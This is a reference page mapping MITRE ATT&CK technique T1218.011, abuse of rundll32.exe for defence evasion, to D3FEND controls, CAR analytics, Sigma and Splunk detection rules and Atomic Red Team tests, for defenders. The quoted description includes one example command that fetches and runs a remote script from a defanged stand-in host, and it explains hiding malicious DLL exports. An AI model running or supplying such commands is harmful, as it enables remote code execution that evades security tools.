# T1218.011: Rundll32
**MITRE ATT&CK Tactic(s):** Defense Evasion

**[MITRE ATT&CK Description](https://attack.mitre.org/techniques/T1218/011)**
<blockquote>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)</blockquote>
## Policy / Process Controls
### [MITRE D3FEND](https://d3fend.mitre.org/)
**Last accessed:** April 25, 2022

**Total ATT&CK-mapped resources:** 2328

**ATT&CK-mapped resources for this (sub)technique:**6

Resources mapped to this (sub)technique can be viewed on [this page](https://d3fend.mitre.org/) (see also the [ATT&CK to D3FEND Mapper](https://d3fend.mitre.org/tools/attack-mapper) tool):

* [File Analysis](https://d3fend.mitre.org/techniques/d3f:FileAnalysis)
* [Process Spawn Analysis](https://d3fend.mitre.org/techniques/d3f:ProcessSpawnAnalysis)
* [System Call Analysis](https://d3fend.mitre.org/techniques/d3f:SystemCallAnalysis)
* [Local File Permissions](https://d3fend.mitre.org/techniques/d3f:LocalFilePermissions)
* [System Call Filtering](https://d3fend.mitre.org/techniques/d3f:SystemCallFiltering)
* [Decoy File](https://d3fend.mitre.org/techniques/d3f:DecoyFile)

## Technical Controls (Detection Rules)
### [Cyber Analytics Repository](https://car.mitre.org)
**Last accessed:** April 25, 2022

**Total ATT&CK-mapped rules:** 159

**ATT&CK-mapped resources for this (sub)technique:**1

Resources mapped to this (sub)technique can be located in the following files within [this repository](https://github.com/mitre-attack/car/blob/master/analytics):

* [car/analytics/CAR-2014-03-006.yaml](https://github.com/mitre-attack/car/blob/master/analytics/CAR-2014-03-006.yaml)

### [Sigma rules public repository](https://github.com/SigmaHQ/sigma)
**Last accessed:** April 25, 2022

**Total ATT&CK-mapped rules:** 2330

**ATT&CK-mapped resources for this (sub)technique:**27

Resources mapped to this (sub)technique can be located in the following files within [this repository](https://github.com/SigmaHQ/sigma/tree/master/rules):

* [sigma/rules/windows/create_remote_thread/sysmon_susp_powershell_rundll32.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/create_remote_thread/sysmon_susp_powershell_rundll32.yml)
* [sigma/rules/windows/file_event/file_event_win_apt_unidentified_nov_18.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_apt_unidentified_nov_18.yml)
* [sigma/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_apt_equationgroup_dll_u_load.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_apt_equationgroup_dll_u_load.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_apt_evilnum_jul20.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_apt_evilnum_jul20.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_apt_sofacy.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_apt_sofacy.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_apt_unidentified_nov_18.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_apt_unidentified_nov_18.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_apt_zxshell.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_apt_zxshell.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_bad_opsec_sacrificial_processes.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bad_opsec_sacrificial_processes.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_c3_load_by_rundll32.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_c3_load_by_rundll32.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_cobaltstrike_load_by_rundll32.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cobaltstrike_load_by_rundll32.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_crime_fireball.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_crime_fireball.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_html_help_spawn.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_html_help_spawn.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_malware_notpetya.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_malware_notpetya.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_powershell_dll_execution.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_dll_execution.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_redmimicry_winnti_proc.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_redmimicry_winnti_proc.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_comsvcs_procdump.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_comsvcs_procdump.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_control_dll_load.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_control_dll_load.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_emotet_rundll32_execution.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_emotet_rundll32_execution.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_pcwutl.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_pcwutl.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_rundll32_activity.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_activity.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_rundll32_by_ordinal.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_by_ordinal.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_rundll32_script_run.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_script_run.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_rundll32_setupapi_installhinfsection.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_setupapi_installhinfsection.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_rundll32_sys.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_sys.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_target_location_shell32.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_target_location_shell32.yml)
* [sigma/rules/windows/process_creation/proc_creation_win_susp_trolleyexpress_procdump.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_trolleyexpress_procdump.yml)

### [Splunk Security Content](https://github.com/splunk/security_content)
**Last accessed:** April 25, 2022

**Total ATT&CK-mapped rules:** 1393

**ATT&CK-mapped resources for this (sub)technique:**16

Resources mapped to this (sub)technique can be located in the following files within [this repository](https://github.com/splunk/security_content/tree/develop/detections):

* [security_content/detections/deprecated/suspicious_rundll32_rename.yml](https://github.com/splunk/security_content/blob/develop/detections/deprecated/suspicious_rundll32_rename.yml)
* [security_content/detections/endpoint/suspicious_icedid_rundll32_cmdline.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/suspicious_icedid_rundll32_cmdline.yml)
* [security_content/detections/endpoint/rundll_loading_dll_by_ordinal.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/rundll_loading_dll_by_ordinal.yml)
* [security_content/detections/endpoint/rundll32_control_rundll_world_writable_directory.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/rundll32_control_rundll_world_writable_directory.yml)
* [security_content/detections/endpoint/suspicious_rundll32_with_no_command_line_arguments.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/suspicious_rundll32_with_no_command_line_arguments.yml)
* [security_content/detections/endpoint/rundll32_control_rundll_hunt.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/rundll32_control_rundll_hunt.yml)
* [security_content/detections/endpoint/rundll32_lockworkstation.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/rundll32_lockworkstation.yml)
* [security_content/detections/endpoint/rundll32_process_creating_exe_dll_files.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/rundll32_process_creating_exe_dll_files.yml)
* [security_content/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml)
* [security_content/detections/endpoint/detect_rundll32_application_control_bypass___setupapi.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_rundll32_application_control_bypass___setupapi.yml)
* [security_content/detections/endpoint/suspicious_rundll32_dllregisterserver.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/suspicious_rundll32_dllregisterserver.yml)
* [security_content/detections/endpoint/rundll32_dnsquery.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/rundll32_dnsquery.yml)
* [security_content/detections/endpoint/suspicious_rundll32_plugininit.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/suspicious_rundll32_plugininit.yml)
* [security_content/detections/endpoint/rundll32_with_no_command_line_arguments_with_network.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/rundll32_with_no_command_line_arguments_with_network.yml)
* [security_content/detections/endpoint/suspicious_rundll32_startw.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/suspicious_rundll32_startw.yml)
* [security_content/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml](https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml)


## Offensive Security Tests
### [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
**Last accessed:** April 25, 2022

**Total ATT&CK-mapped tests:** 1161

**ATT&CK-mapped resources for this (sub)technique:**11

The following unit tests mapped to this (sub)technique can be located in the file [here](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1218.011/T1218.011.yaml):

* Rundll32 execute JavaScript Remote Payload With GetObject
* Rundll32 execute VBscript command
* Rundll32 advpack.dll Execution
* Rundll32 ieadvpack.dll Execution
* Rundll32 syssetup.dll Execution
* Rundll32 setupapi.dll Execution
* Execution of HTA and VBS Files using Rundll32 and URL.dll
* Launches an executable using Rundll32 and pcwutl.dll
* Execution of non-dll using rundll32.exe
* Rundll32 with Ordinal Value
* Rundll32 with Control_RunDLL

### [Cyber Analytics Repository](https://car.mitre.org)
**Last accessed:** April 25, 2022

**Total ATT&CK-mapped tests:** 70

**ATT&CK-mapped resources for this (sub)technique:**1

Resources mapped to this (sub)technique can be located in the following files within [this repository](https://github.com/mitre-attack/car/blob/master/analytics):

* [car/analytics/CAR-2014-03-006.yaml](https://github.com/mitre-attack/car/blob/master/analytics/CAR-2014-03-006.yaml): 1 <code>unit_tests</code>

